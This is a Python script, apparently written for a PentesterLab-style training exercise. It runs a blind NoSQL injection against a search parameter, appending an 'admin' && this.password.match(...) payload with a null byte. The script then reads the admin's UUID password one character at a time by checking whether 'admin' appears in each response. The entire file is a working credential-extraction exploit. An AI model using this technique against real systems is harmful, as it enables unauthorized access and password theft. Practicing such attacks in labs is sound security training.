
def get_match(url):
    response = requests.get(url)
    return response.text.find('admin', POSITION_FIRST_OCURRENCE_OF_ADMIN,UPPER_LIMIT)


def get_next_char(list_inputs, url):
    for input_i in list_inputs:
        password_updated = password + input_i
        print(f'password_updated: {password_updated}')
        pattern = f"/?search=admin'%20%26%26%20this.password.match(/^{password_updated}.*/)%00"
        match = get_match(url + pattern)
        if match != -1:
            return input_i
        
        

import requests

url = 'http://ptl-0d98512a-c4c4330c.libcurl.so/'
password = ''

### TODO: find pattern  to generate this list
list_inputs = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','-']

# In its canonical textual representation, the 16 octets of a UUID are represented as 32 hexadecimal (base-16) digits,
# displayed in five groups separated by hyphens, in the form 8-4-4-4-12 for a total of 36 characters (32 hexadecimal characters and 4 hyphens).
# source: https://en.wikipedia.org/wiki/Universally_unique_identifier
PASS_LENGTH = 36
POSITION_FIRST_OCURRENCE_OF_ADMIN = 1355
UPPER_LIMIT = 50000

while len(password) < PASS_LENGTH:
    char = get_next_char(list_inputs, url)
    print(f'char: {char}')
    password = password + char
    print(f'password: {password}')
